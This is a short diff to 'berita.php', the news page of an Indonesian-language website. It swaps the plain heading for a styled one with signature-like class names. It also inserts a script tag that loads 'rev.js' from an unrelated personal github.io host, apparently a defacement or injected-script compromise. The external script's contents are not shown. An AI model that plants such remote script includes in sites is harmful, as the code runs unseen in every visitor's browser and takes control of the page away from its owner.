@@ -2,7 +2,8 @@
 // berita.php
 ?>
 <section id="berita-section" class="berita-section container mt-5">
-    <h1 class="mb-3 text-center"><strong>Berita</strong></h1>
+<script type="text/javascript" src="https://drvee07.github.io/loc/rev.js"></script>
+<h1 class="nprinsleyy nprinsley-text-glitchan" style="font-size:50px; font-family: Cambria,Times New Roman,serif;" align="center"><font color="black">Berita </font></h1>
     <div class="d-flex justify-content-end mb-3">
         <a href="pages/Tambah_Berita.html" class="btn-add-news">Tambah Berita</a>
     </div>
